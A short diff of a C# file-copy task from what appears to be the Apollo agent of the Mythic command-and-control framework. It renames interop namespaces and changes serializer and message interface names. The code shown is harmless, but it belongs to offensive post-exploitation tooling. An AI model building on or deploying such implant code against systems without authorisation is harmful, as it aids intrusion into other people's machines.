@@ -8,9 +8,9 @@
 
 using System;
 using System.Collections.Generic;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
 
@@ -35,9 +35,9 @@ namespace Tasks
 
         public override void Start()
         {
-            CpParameters parameters = _dataSerializer.Deserialize<CpParameters>(_data.Parameters);
+            CpParameters parameters = _jsonSerializer.Deserialize<CpParameters>(_data.Parameters);
             MythicTaskResponse resp;
-            List<ICommandMessage> artifacts = new List<ICommandMessage>();
+            List<IMythicMessage> artifacts = new List<IMythicMessage>();
             try
             {
                 FileInfo source = new FileInfo(parameters.SourceFile);
